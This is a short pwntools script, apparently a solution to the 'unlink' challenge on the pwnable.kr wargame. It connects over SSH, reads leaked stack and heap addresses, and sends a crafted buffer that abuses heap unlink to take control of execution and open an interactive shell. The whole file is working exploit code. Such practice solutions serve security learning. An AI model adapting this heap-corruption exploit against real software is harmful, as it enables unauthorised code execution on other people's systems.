#!/usr/bin/python2
from pwn import *

s = ssh('unlink', 'pwnable.kr', 2222, 'guest')
p = s.process('./unlink')

shell_addr = 0x080484EB

print p.readuntil('here is stack address leak: '),
stack_addr = int(p.readline(), 16)
print('0x%08x' % stack_addr)
print p.readuntil('here is heap address leak: '),
heap_addr = int(p.readline(), 16)
print('0x%08x' % heap_addr)

exploit_buff = pack(shell_addr, 32)
exploit_buff += 4 * 'A' + 8 * 'A'
exploit_buff += pack(heap_addr + 12, 32)
exploit_buff += pack(stack_addr + 0x10, 32)

p.send(exploit_buff)
p.interactive()
